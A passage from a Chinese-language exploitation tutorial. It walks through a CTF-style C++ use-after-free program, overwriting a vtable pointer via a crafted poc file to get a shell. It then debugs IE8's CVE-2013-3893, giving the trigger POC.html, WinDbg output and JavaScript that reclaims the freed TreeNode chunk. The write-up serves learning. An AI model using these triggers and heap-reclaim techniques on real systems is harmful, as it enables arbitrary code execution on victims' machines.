<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">​	Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">​	Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">size_t</span> len;</span><br><span class="line">​	<span class="keyword">char</span>* data;</span><br><span class="line">​	<span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">​	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">​		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">​		<span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line">​		<span class="keyword">switch</span>(op)&#123;</span><br><span class="line">​			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">​				m-&gt;introduce();</span><br><span class="line">​				w-&gt;introduce();</span><br><span class="line">​				<span class="keyword">break</span>;</span><br><span class="line">​			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">​				len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">​				data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">​				read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">​				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">​				<span class="keyword">break</span>;</span><br><span class="line">​			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">​				<span class="keyword">delete</span> m;</span><br><span class="line">​				<span class="keyword">delete</span> w;</span><br><span class="line">​				<span class="keyword">break</span>;</span><br><span class="line">​			<span class="keyword">default</span>:</span><br><span class="line">​				<span class="keyword">break</span>;</span><br><span class="line">​		&#125;</span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-1代码分析"><a href="#1-2-1代码分析" class="headerlink" title="1.2.1代码分析"></a>1.2.1代码分析</h3><p>通过IDA反汇编，不过C++的代码已经非常难以看懂了，代码主要分两大块解析。</p>
<p>第一部分是类和子类的定义，定义的父类Human和子类Man和Woman。其中父类包含get_shell函数，虽然子类并没有定义，但是通过继承关系可知，在实例化过程中，虚函数表中函数会包含这个函数。</p>
<p>第二部分就是类的实例化和use after free 三个功能。</p>
<p>接下来我们将程序重要的部分分析一下，以便理解漏洞。</p>
<p>（1）实例化对象</p>
<p>Human* m &#x3D; new Man(“Jack”, 25);这句在IDA翻译如下，变量v3为实例化Man对象之后的指针。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/P6blmu.png" alt="P6blmu"></p>
<p>找到对应的反汇编，0x400F13这个地方是对象实例化的函数，在call执行结束之后，EBX中便保存这Man对象的指针，即上文中的v3变量。可以通过gdb下断点进行调试。</p>
<p>当实例完对象之后，ebx存放的地址（0x401570），也就是前文中所说的虚函数表vfptr，指向的第一个函数Human继承下来的give_shell。  </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/nTVxnH.png" alt="nTVxnH"><br><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/SuwrBU.png" alt="SuwrBU"><br><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/QP0fi9.png" alt="QP0fi9"></p>
<p>让我们查看虚表的内存，可以看到Man的虚表中有两个函数。虚表偏移8字节便是introduce函数。<img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/u242hU.png" alt="u242hU"> </p>
<p>（2）调用方法</p>
<p>源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">case 1:</span><br><span class="line">​				m-&gt;introduce();</span><br><span class="line">​				w-&gt;introduce();</span><br><span class="line">​				break;</span><br></pre></td></tr></table></figure>
<p>IDA中对应的伪代码</p>
<p> <img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/liuHkz.png" alt="liuHkz"></p>
<p>指针v13和v14分别对应实例化的Man和Woman，Woman的虚函数表的结构与Man是相同的（地址不同），所以不再赘述。</p>
<p>通过观察虚函数表结构，我们已经知道introduce为虚表表头偏移8个字节，所以便有了v13+8字节偏移。</p>
<p>这里就埋下一个伏笔，如果对虚表指针的地址进行改写，将虚表向前偏移8个字节，这样本来调用introduce方法就会调用getshell方法。</p>
<p>对应的反汇编如下，非常建议自己动态调试一遍，能够加深印象。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/dwZ4eN.png" alt="dwZ4eN"></p>
<h3 id="1-2-2UAF利用流程"><a href="#1-2-2UAF利用流程" class="headerlink" title="1.2.2UAF利用流程"></a>1.2.2UAF利用流程</h3><p>（1）程序实例化Man和Women</p>
<p>（2）使用Free将Man和Women分别Free （free）</p>
<p>（3）再分配内存，这里我们需要分配24字节，为了占坑。（after） </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/nHULk7.png" alt="nHULk7"><br>因为24字节（0x18）和之前分配的Man和Women一样（上图所示），所以会发生占坑现象，也就是说程序会将之前被释放的Man和Women空间分配给这个指针。此时读取文件（poc）的内容，因为占坑之后内存指针指向的第一个字符就是，覆盖之前Man和Women的虚函数。</p>
<p>Poc的内容就是*$ python -c “print ‘\x68\x15\x40\x00\x00\x00\x00\x00’”&gt; poc*</p>
<p>即0x401468&#x3D;0x401570-8，原虚函数表地址-8字节。 </p>
<p>（4）调用Man的悬挂指针，因为虚函数表被我们从poc读入的数据改写，调用intruduce会调用getshell</p>
<p>（5）利用结束</p>
<p>使用UAF修改C++虚表，改变程序流程。</p>
<p>调试过程中，建议下如下的断点，可以让程序停在关键的地方。也可以在调试过程中，多尝试用Ctrl+C呼叫程序暂停，然后设置断点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x400f13</span><br><span class="line">Breakpoint 1 at 0x400f13</span><br><span class="line">gdb-peda$ b *0x400fcd</span><br><span class="line">Breakpoint 2 at 0x400fcd</span><br><span class="line">gdb-peda$ b *0x40102d</span><br><span class="line">Breakpoint 3 at 0x40102d</span><br><span class="line">gdb-peda$ b *0x401076</span><br><span class="line">Breakpoint 4 at 0x401076</span><br></pre></td></tr></table></figure>
<p>根据如下的操作，我们很容易就获取了shell，注意传递参数poc文件</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/LDatJd.png" alt="LDatJd"><br><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/nUZJaz.png" alt="nUZJaz"> </p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>UAF在浏览器漏洞中多为对C++对象（虚函数）的修改，悬挂指针是UAF利用的关键，调用被Free的函数，如果这个函数的位置已经被别的对象占坑，进行了修改，那么调用悬挂指针就可能能够造成任意代码执行。结合Heap Spray会产生很好的效果。</p>
<p> <br><br></p>
<h1 id="0x02-IE浏览器UAF漏洞"><a href="#0x02-IE浏览器UAF漏洞" class="headerlink" title="0x02 IE浏览器UAF漏洞"></a>0x02 IE浏览器UAF漏洞</h1><p><em><strong>调试环境：</strong></em></p>
<ul>
<li><p>Windows 7 SP1</p>
</li>
<li><p>IE8</p>
</li>
<li><p>漏洞编号:CVE-2013-3893</p>
</li>
</ul>
<p>该漏洞是的原理是，IE下的mshtml动态连接库将TreeNode对象从Dom树释放后，又重新调用对象的任意代码执行。是一个典型的浏览器UAF漏洞，最后使用精准堆喷射完成利用。</p>
<p>因为本文作者调试实例漏洞的功底有限，所以会漏洞如何发现以及利用部分，漏洞的原理和挖掘的讲解可能达不到高水平读者的要求，希望读者能谅解。</p>
<h2 id="2-1漏洞分析"><a href="#2-1漏洞分析" class="headerlink" title="2.1漏洞分析"></a>2.1漏洞分析</h2><p>可以通过msf&#x2F;exploit-db获取这个漏洞的POC，我们对其进行一些修改，方便我们的分析。</p>
<p>调试的poc代码如下</p>
<p>POC.html</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">​		<span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">​		</span>&#123;</span><br><span class="line">​			<span class="built_in">Math</span>.tan(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">​			<span class="keyword">var</span> father=<span class="built_in">document</span>.createElement(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">​			<span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;child&quot;</span>);</span><br><span class="line">​			<span class="built_in">Math</span>.tan(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			<span class="built_in">document</span>.body.appendChild(father);</span><br><span class="line">​			<span class="built_in">document</span>.body.appendChild(child);</span><br><span class="line">​			<span class="built_in">Math</span>.sin(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">​				<span class="built_in">document</span>.write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">​				<span class="comment">//alert(&quot;123&quot;);</span></span><br><span class="line">​			&#125;</span><br><span class="line">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			father[<span class="string">&#x27;outerText&#x27;</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line">​		&#125;</span><br><span class="line">​		<span class="built_in">window</span>.setTimeout(<span class="string">&quot;trigger()&quot;</span>,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">​	&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-1-1-基于POC的流程分析"><a href="#2-1-1-基于POC的流程分析" class="headerlink" title="2.1.1 基于POC的流程分析"></a>2.1.1 基于POC的流程分析</h3><p>首先要清楚POC的运行流程，通过createElement创建两个对象father和child</p>
<p>接着为两个对象分别创建两个结点。效果如图所示，<body>标签下创建了<father>和<child>标签。同时也会创建一个TreeNode对象。 </child></father></body></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/2Y1gyh.png" alt="2Y1gyh"></p>
<p>将child作为father的子结点</p>
<p>*father[‘outerText’]&#x3D;””*将元素本身赋值为空对象，这句会导致DOM树中所有father的子孙结点都被析构（fahter、child）也就是说TreeNode会从DOM上脱离。</p>
<p><em>father.setCapture();child.setCapture();father</em>鼠标指针聚焦，child鼠标指针聚焦，导致father失焦，会触发<em>father.onlosecapture&#x3D;function()</em></p>
<p><em>document.write(“”);</em></p>
<p>漏洞触发的位置</p>
<p>在调用*document.write(“”);*时候，释放了TreeNode对象，但是在程序之后运行的函数中，使用了这个被释放的对象，导致了释放后重用漏洞。</p>
<p>POC调试</p>
<p>程序断点在了CTreeNode::GetInterface函数，call ecx指向的地址。</p>
<p>使用kv可以追踪函数的流程。按照这样的回溯也是可以分析漏洞的。不过为了更精确地找到造成中断的根源，我们开启页堆（page heap），这样程序在遇到堆结构被破坏时会更即使地断下。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/OuISHi.png" alt="OuISHi"></p>
<p>使用Windbg的Global Flags工具开启page heap（页堆），选择Enable page heap选项。</p>
<p>不建议开启左下角的Enable heap tagging，会导致后面调试经常出问题。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/zuvuws.png" alt="zuvuws"></p>
<p>再次运行POC，程序断点在了HasContainerCapture+0x14的位置。根据栈回溯，可以发现比之前的断点位置更靠前了一些。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/0VjXso.png" alt="0VjXso"></p>
<p>使用kv查看栈回溯，使用ub查看具体触发的代码。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/OE8PLn.png" alt="OE8PLn"><br><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/QQJYry.png" alt="QQJYry"></p>
<p>我们再次查看HasContainerCapture+0x14的位置，发现他实际调用了一个已经被释放到对象TreeNode，从而造成了释放后重用（UAF）漏洞。</p>
<p>继续向下看，我们分析此时造成崩溃的EDI参数，!heap -p -a edi查看edi所在堆的状态。</p>
<p>可以看到EDI所指向的堆已经在!CTreeNode::Release被释放了。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/V44Jjz.png" alt="V44Jjz"><br><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/cLSvwl.png" alt="cLSvwl"><br><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/tPbbzy.png" alt="tPbbzy"></p>
<p>重新调试一遍，查看TreeNode对象（地址和上一次调试不同）在被释放前的空间为0x4c，所以只需要在被释放之后，用js立即分配一块相同大小的堆就能进行占位。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/62zAnF.png" alt="62zAnF"></p>
<p>虽然知道POC触发了UAF漏洞，但是我们对这个漏洞的具体细节还一无所知，更不用提利用了。所以我们要从程序流程的角度来分析一下漏洞触发的原因。</p>
<p>接下来关闭页堆，进一步调试整个POC的触发的程序流程，以及UAF是如何造成影响的。</p>
<p>修改一下poc（增加了一段js，创建了一个div对象，具体原因下文会说明），继续调试。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">​		<span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">​		</span>&#123;</span><br><span class="line">​			<span class="built_in">Math</span>.tan(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">​			<span class="keyword">var</span> father=<span class="built_in">document</span>.createElement(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">​			<span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;child&quot;</span>);</span><br><span class="line">​			<span class="built_in">Math</span>.tan(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			<span class="built_in">document</span>.body.appendChild(father);</span><br><span class="line">​			<span class="built_in">document</span>.body.appendChild(child);</span><br><span class="line">​			<span class="built_in">Math</span>.sin(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">​				<span class="built_in">document</span>.write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">​				<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​				tt = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">20</span>);</span><br><span class="line">​    			<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; tt.length; i++) &#123;</span><br><span class="line">​      			tt[i] = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">​      			tt[i].className = <span class="string">&quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line">​				<span class="comment">//alert(&quot;123&quot;);</span></span><br><span class="line">​			&#125;</span><br><span class="line">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			father[<span class="string">&#x27;outerText&#x27;</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line">​		&#125;</span><br><span class="line">​		<span class="built_in">window</span>.setTimeout(<span class="string">&quot;trigger()&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">​	&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>首先对几个关键部分下断点，在POC中写入一些三角函数，例如tan、sin、cos这几个JS的函数主要是帮助我们判断程序运行到哪个位置，因为在程序汇总我们下断点到函数会反复地运行，可能会多次断下，但是不一定是我们需要到断点。（比如调试时候，tan还没断下来，CElement就断了好几次，这个断点就需要我们跳过）</p>
<p>下面是我下的断点，仅供参考。（到后期调试最后两个断点可以去掉）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; bl</span><br><span class="line"> 0 e 6d86d898     0001 (0001)  0:**** jscript!tan</span><br><span class="line"> 2 e 6d86d6e9     0001 (0001)  0:**** jscript!sin</span><br><span class="line"> 3 e 6d86d657     0001 (0001)  0:**** jscript!cos</span><br><span class="line"> 4 e 6ba49fd3     0001 (0001)  0:**** mshtml!CElement::CElement</span><br><span class="line"> 5 e 6b9caed1     0001 (0001)  0:**** mshtml!CMarkup::InsertElementInternal</span><br><span class="line"> 6 e 6b9e5acf     0001 (0001)  0:**** mshtml!CElement::appendChild</span><br></pre></td></tr></table></figure>

<p>首先断点在了tan，三角函数断点并不是必须的，但是在调试IE这样程序流复杂的对象时，可以帮助我们判断程序运行的位置。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/4Ow3aO.png" alt="4Ow3aO"> </p>
<p>第一个CElement::CElement断点，当然直接给createElement下断点也是可以的，但是要获取这个对象的指针，需要运行CElement+0x18的位置。此时EDI存放的便是Element对象的指针。</p>
<p>即var father&#x3D;document.createElement(“father”);中的father</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/BhVzkf.png" alt="BhVzkf"> </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/9Hfnuy.png" alt="9Hfnuy"> </p>
<p>为什么我们能判断此时的EDI是Element的对象指针呢，其实分析0x6ba49feb地址的这句语句，将C++的虚函数表地址放入了[EDI]的位置，这不就是C++ 初始化对象的行为嘛。对象的头部就是虚函数表。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/Rmz0YH.png" alt="Rmz0YH"> </p>
<p>第二个断点，也是同理，var child&#x3D;document.createElement(“child”);中的child对象指针为2eebd88.</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/ojgyCe.png" alt="ojgyCe"> </p>
<p>中途再次断在tan，g继续运行</p>
<p>创建子结点father</p>
<p>document.body.appendChild(father);</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/igtWIh.png" alt="igtWIh"></p>
<p>创建了一个TreeNode对象，指针默认通过EAX值返回。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/c5N0OD.png" alt="c5N0OD"> </p>
<p>​	</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/TmeyeE.png" alt="TmeyeE"> </p>
<p>同理第二个子结点，也可以获取它的指针（child）</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/thVR8Z.png" alt="thVR8Z"></p>
<p>运行结束之后，可以看一下目前的内存结构，发现已经形成了一个类似链表的结构。</p>
<p>查看内存空间，下图中从上到下分别是</p>
<p>Element对象father</p>
<p>子节点<father></father></p>
<p>Element对象child</p>
<p>Element对象child</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/uR4Qfh.png" alt="uR4Qfh"></p>
<p>结构图为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Element对象father(2eec048)    Element对象child(2eebd88)</span><br><span class="line">​      |                                  |</span><br><span class="line">​      V                                  V</span><br><span class="line">子节点&lt;father&gt;(2ee8ac0)         子节点&lt;child&gt;(2ee8388)</span><br><span class="line">       ^                                 ^</span><br><span class="line">       |                                  |</span><br><span class="line">       ------------------------------------</span><br><span class="line">                         |</span><br><span class="line">​             CBody_TreeNode(02f123a8)</span><br></pre></td></tr></table></figure>
<p>而TreeNode则为我们这次释放后重用漏洞的利用对象，通过链表关系我们其实可以知道，调试过程中只需要获取fahter对象的指针，就能通过链表关系获取到TreeNode指针，下一次调试就会节省很多时间。</p>
<p>接下来程序断点在了sin函数，继续g运行，child.applyElement(father)，直到运行到cos函数。</p>
<p>此时查看内存，能发现<child>变成了<father>的子结点。</father></child></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/Zh5FuG.png" alt="Zh5FuG"> </p>
<p>结构图为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Element对象father(2eec048)    Element对象child(2eebd88)</span><br><span class="line">​      |                                  |</span><br><span class="line">​      V                                 V</span><br><span class="line">子节点&lt;father&gt;(2ee8ac0)   &lt;--    子节点&lt;child&gt;(2ee8388)</span><br><span class="line">					^                                 </span><br><span class="line">					|                                  </span><br><span class="line">					\-------------</span><br><span class="line">												|</span><br><span class="line">​             CBody_TreeNode(02f123a8)</span><br></pre></td></tr></table></figure>

<p>之后执行father[‘outerText’]&#x3D;””会发现father以及他的子节点都被清空了。TreeNode也不在Dom树上了，但是这块内存指针依然存在。</p>
<p>使用!heap -p -a 02f123a8,发现这块内存依旧busy，size为4c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 02f123a8</span><br><span class="line">​    address 02f123a8 found in</span><br><span class="line">​    _HEAP @ 200000</span><br><span class="line">​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">​        02f12390 000d 0000  [00]   02f123a8    0004c - (busy)</span><br></pre></td></tr></table></figure>

<p>执行father.setCapture();child.setCapture();会触发father.onlosecapture函数</p>
<p>进而执行的document.write(“”)会将TreeNode释放</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!heap -p -a 02f123a8,发现内存已经被free了</span><br><span class="line">0:005&gt; !heap -p -a 02f123a8</span><br><span class="line">​    address 05118558 found in</span><br><span class="line">​    _HEAP @ 200000</span><br><span class="line">​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">​        02f12390 000d 0000  [00]   02f12398    00060 - (free)</span><br></pre></td></tr></table></figure>



<p>这里就需要划重点了，这个内存被释放了，而之后这个内存的指针依然存在，甚至还被程序调用了。这明显是一个UAF漏洞，这时我们要利用之前讲的占坑技术，申请一段和之前差不多大小的内存，就能成功控制这块内存。</p>
<p>于是此时我们可以使用Js申请多个与被释放对象相同大小的内存块，对其进行占位。（申请多个是为了保证Exp稳定性）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tt &#x3D; new Array(20);</span><br><span class="line">for(i &#x3D; 0; i &lt; tt.length; i++) &#123;</span><br><span class="line">​     tt[i] &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">​     tt[i].className &#x3D; &quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>

<p>使用javascript申请大量80字节左右的空间（78个0x0c+2个<div>）</div></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt[i].className &#x3D; &quot;\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u2222\u3333\u4444\u1111&quot;;&#x2F;&#x2F;替代\0c</span><br></pre></td></tr></table></figure>
<p>查看TreeNode内存空间，发现占位成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 02f123a8</span><br><span class="line">​    address 02f123a8 found in</span><br><span class="line">​    _HEAP @ 220000</span><br><span class="line">​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">​        02f12390 000d 0000  [00]   02f123a8    0004e - (busy)</span><br></pre></td></tr></table></figure>
